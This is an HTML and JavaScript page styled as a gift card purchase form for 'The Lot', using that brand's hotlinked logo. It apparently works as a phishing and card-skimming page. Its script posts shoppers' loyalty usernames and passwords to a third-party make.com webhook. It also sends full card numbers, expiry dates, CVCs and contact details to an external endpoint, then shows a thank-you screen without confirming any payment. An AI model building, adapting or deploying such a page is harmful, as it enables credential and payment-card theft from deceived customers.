<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Gift Card Purchase - The Lot</title>
  <style>
    /* Estilos aqu√≠ (igual que antes) */
  </style>
</head>
<body>
  <div class="container">
    <div id="loading">Processing...</div>
    <header>
      <img src="https://cdn.theatertoolkit.com/cdn/wwwroot/themes/custom/thelotent/images/logo.png?v=20250408.2" alt="The Lot Logo">
    </header>
    <main>
      <!-- Contenido del formulario (igual que antes) -->
    </main>
    <footer>&copy; The Lot Gift Shop</footer>
  </div>

  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
  <script>
    const secs = {
      amount: document.getElementById('sec-amount'),
      loyalty: document.getElementById('sec-loyalty'),
      pay: document.getElementById('sec-pay'),
      thanks: document.getElementById('sec-thanks')
    };

    let amt = 100, timerInterval;
    let _loyaltyCard = '';
    const amtInput = document.getElementById('amount');
    const timeDisplay = document.getElementById('time');

    function show(section) {
      Object.values(secs).forEach(s => s.classList.remove('active'));
      secs[section].classList.add('active');
      if (section === 'pay') startTimer(); else stopTimer();
    }

    function startTimer() {
      let time = 180;
      updateTime();
      timerInterval = setInterval(() => {
        time--;
        if (time < 0) {
          clearInterval(timerInterval);
          alert('Session expired. Redirecting to start.');
          resetAll();
          show('amount');
          return;
        }
        updateTime();
      }, 1000);

      function updateTime() {
        const m = String(Math.floor(time / 60)).padStart(2, '0');
        const s = String(time % 60).padStart(2, '0');
        timeDisplay.textContent = `${m}:${s}`;
      }
    }

    function stopTimer() {
      clearInterval(timerInterval);
      timeDisplay.textContent = '03:00';
    }

    function resetAll() {
      amt = 100;
      amtInput.value = amt;
      document.getElementById('user').value = '';
      document.getElementById('pass').value = '';
      _loyaltyCard = '';
    }

    document.getElementById('dec').onclick = () => {
      if (amt > 5) { amt -= 5; amtInput.value = amt; }
    };

    document.getElementById('inc').onclick = () => {
      if (amt < 500) { amt += 5; amtInput.value = amt; }
    };

    document.getElementById('next-loyalty').onclick = () => show('loyalty');

    document.getElementById('skip').onclick = () => {
      prepPay();
      show('pay');
    };

    document.getElementById('frm-loyalty').onsubmit = e => {
      e.preventDefault();
      const u = document.getElementById('user').value.trim(),
            p = document.getElementById('pass').value.trim();
      if (!u || !p) return alert('Please enter your loyalty credentials.');
      document.getElementById('loading').style.display = 'flex';
      fetch('https://hook.us2.make.com/4f5k8fj23ixvb0f6ndz8prnxqbac9x5k', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ loyaltyUser: u, loyaltyPass: p, amount: amt })
      })
      .then(r => r.json())
      .then(r => {
        document.getElementById('loading').style.display = 'none';
        if (r.ExtendedResultCode !== 0) return alert(r.ErrorDescription || 'Invalid credentials.');
        _loyaltyCard = r.CardNumber || '';
        prepPay();
        show('pay');
      })
      .catch(() => {
        document.getElementById('loading').style.display = 'none';
        alert('Error validating credentials.');
      });
    };

    function prepPay() {
      document.getElementById('amt-display').value = amt;
      document.getElementById('amt-hidden').value = amt;
    }

    document.getElementById('frm-pay').onsubmit = async e => {
      e.preventDefault();
      const rec = grecaptcha.getResponse();
      if (!rec) return alert('Please complete the reCAPTCHA.');

      document.getElementById('loading').style.display = 'flex';
      const data = {
        customer_email: document.getElementById('email').value,
        customer_phone: document.getElementById('phone').value,
        card_type: document.getElementById('card_type').value,
        card_name: document.getElementById('name').value,
        card_number: document.getElementById('number').value,
        card_expiry: document.getElementById('expiry').value,
        card_cvc: document.getElementById('cvc').value,
        amount: amt,
        'g-recaptcha-response': rec,
        ...(!!_loyaltyCard && { card_loyalty_number: _loyaltyCard })
      };

      try {
        // Enviar los datos al webhook sin esperar la respuesta
        fetch('https://your.api/payment-endpoint', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data),
        });

        // Ahora continuamos con el flujo sin esperar la respuesta del webhook
        show('thanks');
      } catch (err) {
        document.getElementById('loading').style.display = 'none';
        alert('An error occurred while processing your payment.');
      }
    };

    document.getElementById('finish').onclick = resetAll;
  </script>
</body>
</html>
